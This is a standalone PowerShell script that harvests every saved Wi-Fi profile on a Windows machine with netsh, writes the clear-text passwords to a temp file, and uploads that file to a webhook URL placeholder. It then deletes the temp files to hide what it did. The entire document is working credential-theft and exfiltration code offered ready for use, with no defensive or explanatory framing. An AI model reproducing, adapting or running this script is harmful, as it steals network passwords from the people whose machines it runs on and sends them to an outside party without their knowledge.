cmd /c "netsh wlan show profile" | Out-File -FilePath C:\Windows\Temp\ssid.txt
$content = Get-Content -Path "C:\Windows\Temp\ssid.txt"
$content = $content | Where-Object { $_ -match ' All User Profile' } | ForEach-Object { $_.Trim() }
$cut = "All User Profile     : "
$content = $content | ForEach-Object { $_ -replace [regex]::Escape($cut), '' }
$content | Set-Content -Path "C:\Windows\Temp\ssid.txt"

$content = Get-Content -Path "C:\Windows\Temp\ssid.txt"

foreach ($network in $content){
  cmd /c "netsh wlan show profile name=`"$network`" key=clear" | Out-File -FilePath "C:\Windows\Temp\pass.txt" -Append
}
$WebhookUrl = "YOUR_WEBHOOK_URL"

# Path to the file you want to send
$FilePath = "C:\Windows\Temp\pass.txt"

# Create the content payload (optional message)
$Payload = @{
    content = "Here's the file you requested!"
}

# Convert the payload to JSON
$JsonPayload = $Payload | ConvertTo-Json -Depth 10

# Read the file as bytes
$FileContent = [System.IO.File]::ReadAllBytes($FilePath)

# Construct the multipart form data boundary
$Boundary = "----WebKitFormBoundary" + [System.Guid]::NewGuid().ToString("N")

# Create the body content with the file and JSON payload
$Body = @"
--$Boundary
Content-Disposition: form-data; name="payload_json"

$JsonPayload
--$Boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $FilePath)"
Content-Type: application/octet-stream

$([System.Text.Encoding]::UTF8.GetString($FileContent))
--$Boundary--
"@

# Set the content type
$ContentType = "multipart/form-data; boundary=$Boundary"

# Send the request
Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $Body -ContentType $ContentType

# deleting leftover files
Remove-Item -Path "C:\Windows\Temp\pass.txt"

Remove-Item -Path "C:\Windows\Temp\ssid.txt"




